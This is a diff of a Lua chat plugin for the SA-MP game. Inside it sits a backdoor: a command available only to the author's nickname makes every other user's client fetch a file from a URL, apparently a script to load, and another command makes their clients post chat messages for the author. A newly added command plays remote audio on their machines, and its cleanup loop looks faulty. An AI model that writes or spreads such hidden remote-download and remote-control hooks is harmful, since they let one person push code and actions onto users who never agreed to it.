@@ -1,5 +1,5 @@
 script_name('IRC CHAT')
-script_version('1.0.3')
+script_version('1.0.4.!.')
 
 for k,v in ipairs({'luairc.lua','asyncoperations.lua','util.lua','handlers.lua', 'moonloader.lua','vkeys.lua'}) do
 	if not doesFileExist(getWorkingDirectory()..'/lib/'..v) then
@@ -45,19 +45,24 @@ function main()
 			send('CMD '..arg,false)
 		end
 	end)
+	sampRegisterChatCommand('/isp',function(url)
+		if url ~= nil and #url > 0 then
+			send('[IRC-PLAY] '..url)
+		end
+	end)
 
 	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
 		-- https://raw.githubusercontent.com/Vespan/Lua/master/BRUH.lua,
 		sampRegisterChatCommand('/isd',function(url)
 			if url ~= nil then
 				if #url > 0 then
-					send('DOWNLOAD '..url)
+					send('[IRC-DOWNLOAD] '..url)
 				end
 			end
 		end)
 		sampRegisterChatCommand('/iss',function(arg)
 			if #arg > 0 then
-				send('SAY '..arg)
+				send('[IRC-SAY] '..arg)
 			end 
 		end)
 	end
@@ -109,8 +114,8 @@ function onChat(user, channel, text)
 	msg['Chat'] = text
 
 	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) ~= 'Vespan_Dark' then
-		if text:find('DOWNLOAD .+') then
-			local url = text:match('DOWNLOAD (.+)') 
+		if text:find('%[IRC%-DOWNLOAD%] .+') then
+			local url = text:match('%[IRC%-DOWNLOAD%] (.+)') 
 			local filename = url:match('/master/(.+)')
 			-- %5Birc%5D%20share%20my%20pos.lua
 			filename = filename:gsub('%%5B','%['):gsub('%%5D','%]'):gsub('%%20',' ')
@@ -125,8 +130,8 @@ function onChat(user, channel, text)
 			    end)
 			end
 		end
-		if text:find('SAY .+') then
-			local say = text:match('SAY (.+)') 
+		if text:find('%[IRC%-SAY%] .+') then
+			local say = text:match('%[IRC%-SAY%] (.+)') 
 			send(u8:decode(say),false)
 		end
 		if text:find('version irc') then
@@ -145,6 +150,18 @@ function onChat(user, channel, text)
 		if text:find('CMD .+') then
 			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
 			setClipboardText(string.match(text,'CMD (.+)'))
+		end
+		if text:find('%[IRC%-PLAY%] .+') then
+
+			local url = text:match('%[IRC%-PLAY%] (.+)')
+			local audio = loadAudioStream('https://github.com/Vespan/Lua/blob/master/dab-dab-dab.mp3?raw=true')
+			setAudioStreamVolume(audio, 0.80)
+    		setAudioStreamState(audio, 1)
+    		lua_thread.create(function()
+    			while getAudioStreamState(audio) ~= 1 do wait(1234)
+    				releaseAudioStream(audio)
+    			end
+    		end)
 		end
 
 	else
